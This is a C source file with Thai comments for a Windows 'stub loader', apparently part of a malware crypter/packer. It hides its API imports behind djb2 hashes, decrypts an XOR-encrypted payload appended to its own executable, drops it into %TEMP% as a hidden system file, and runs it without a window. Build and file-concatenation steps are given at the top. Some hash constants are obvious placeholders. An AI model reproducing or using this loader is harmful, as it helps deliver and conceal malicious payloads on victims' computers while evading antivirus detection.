// stub.c — Nozita Stub Loader (รัน packed payload ใน memory)
// cl /O2 /GS- /Zl stub.c /link /SUBSYSTEM:WINDOWS /ENTRY:sMain
//    /NODEFAULTLIB kernel32.lib /OUT:stub.exe
// จากนั้น: copy /b stub.exe + packed_payload.bin = final.exe
// หรือใช้ packer.c ที่ prepend stub ให้อัตโนมัติ

#include <windows.h>

#define MAGIC    0x4E5A544B
#define STUB_SZ  0x4000     // ขนาด stub (16KB) — ต้องตรงกับ actual stub size

typedef BOOL  (WINAPI*pfRF)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef BOOL  (WINAPI*pfWF)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef HANDLE(WINAPI*pfCF)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
typedef BOOL  (WINAPI*pfCH)(HANDLE);
typedef LPVOID(WINAPI*pfVA)(LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL  (WINAPI*pfVF)(LPVOID,SIZE_T,DWORD);
typedef DWORD (WINAPI*pfGTP)(DWORD,LPSTR);
typedef BOOL  (WINAPI*pfCP)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,
                             BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef DWORD (WINAPI*pfGMF)(HMODULE,LPSTR,DWORD);
typedef DWORD (WINAPI*pfGFS)(HANDLE,LPDWORD);
typedef BOOL  (WINAPI*pfSFA)(LPCSTR,DWORD);

// minimal djb2 for API resolution
static DWORD _h(const char*s){DWORD h=5381;while(*s)h=((h<<5)+h)^(DWORD)(unsigned char)*s++;return h;}
static FARPROC _r(HMODULE m,DWORD w){
    if(!m)return NULL;
    PIMAGE_DOS_HEADER d=(PIMAGE_DOS_HEADER)m;
    PIMAGE_NT_HEADERS n=(PIMAGE_NT_HEADERS)((BYTE*)m+d->e_lfanew);
    DWORD er=n->OptionalHeader.DataDirectory[0].VirtualAddress; if(!er)return NULL;
    PIMAGE_EXPORT_DIRECTORY e=(PIMAGE_EXPORT_DIRECTORY)((BYTE*)m+er);
    DWORD*nm=(DWORD*)((BYTE*)m+e->AddressOfNames);
    WORD* od=(WORD*) ((BYTE*)m+e->AddressOfNameOrdinals);
    DWORD*fn=(DWORD*)((BYTE*)m+e->AddressOfFunctions);
    for(DWORD i=0;i<e->NumberOfNames;i++){
        const char*s2=(const char*)((BYTE*)m+nm[i]);
        if(_h(s2)==w)return(FARPROC)((BYTE*)m+fn[od[i]]);
    }
    return NULL;
}

int WINAPI sMain(void){
    HMODULE hk=GetModuleHandleA("kernel32.dll");

    pfGMF GMF=(pfGMF)_r(hk,0x1a2b3c4d); // GetModuleFileNameA — FILL hash
    pfCF  CF =(pfCF) _r(hk,0x8e340350); // CreateFileA
    pfGFS GFS=(pfGFS)_r(hk,0x5e6f7a8b); // GetFileSize
    pfVA  VA =(pfVA) _r(hk,0x97bc257c); // VirtualAlloc
    pfRF  RF =(pfRF) _r(hk,0xe734c9e4); // ReadFile
    pfCH  CH =(pfCH) _r(hk,0x7c0017a5); // CloseHandle
    pfVF  VF =(pfVF) _r(hk,0x9dbc257c); // VirtualFree
    pfGTP GTP=(pfGTP)_r(hk,0x6e73c5f1); // GetTempPathA
    pfWF  WF =(pfWF) _r(hk,0xf734c9e4); // WriteFile
    pfCP  CPR=(pfCP) _r(hk,0xabc12301); // CreateProcessA
    pfSFA SFA=(pfSFA)_r(hk,0x2b3c4d5e); // SetFileAttributesA

    // อ่าน self
    char self[MAX_PATH]={0};
    GMF(NULL,self,MAX_PATH);
    HANDLE hf=CF(self,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 1;

    DWORD fsz=GFS(hf,NULL);
    BYTE*raw=(BYTE*)VA(NULL,fsz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    DWORD rd=0; RF(hf,raw,fsz,&rd,NULL); CH(hf);

    // parse header (อยู่หลัง stub)
    BYTE*hdr=raw+STUB_SZ;
    if(*(DWORD*)hdr!=MAGIC){VF(raw,0,MEM_RELEASE);return 2;}
    DWORD origSz=*(DWORD*)(hdr+4);
    BYTE  key   =hdr[8];
    BYTE* enc   =hdr+9;

    // decrypt
    BYTE*dec=(BYTE*)VA(NULL,origSz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    for(DWORD i=0;i<origSz;i++) dec[i]=enc[i]^key;

    // write to %TEMP%
    char tmp[MAX_PATH]={0},out[MAX_PATH]={0};
    GTP(MAX_PATH,tmp);

    // สร้างชื่อไฟล์จาก pointer address (ไม่ซ้ำ)
    DWORD rnd=(DWORD)(ULONG_PTR)dec ^ GetTickCount();
    int   len=0;
    char* p=out;
    // copy tmp path
    for(;tmp[len];len++) p[len]=tmp[len];
    // append hex name
    char hex[]="0123456789abcdef";
    p[len++]='n'; p[len++]='z'; p[len++]='_';
    for(int i=7;i>=0;i--){p[len++]=hex[(rnd>>(i*4))&0xF];}
    p[len++]='.'; p[len++]='e'; p[len++]='x'; p[len++]='e'; p[len]=0;

    HANDLE ho=CF(out,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(ho==INVALID_HANDLE_VALUE){VF(raw,0,MEM_RELEASE);VF(dec,0,MEM_RELEASE);return 3;}
    DWORD bw=0; WF(ho,dec,origSz,&bw,NULL); CH(ho);

    // ซ่อนไฟล์
    SFA(out,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);

    VF(raw,0,MEM_RELEASE);
    VF(dec,0,MEM_RELEASE);

    // รัน
    STARTUPINFOA si; ZeroMemory(&si,sizeof(si)); si.cb=sizeof(si);
    PROCESS_INFORMATION pi; ZeroMemory(&pi,sizeof(pi));
    CPR(out,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(pi.hProcess) CH(pi.hProcess);
    if(pi.hThread)  CH(pi.hThread);
    return 0;
}
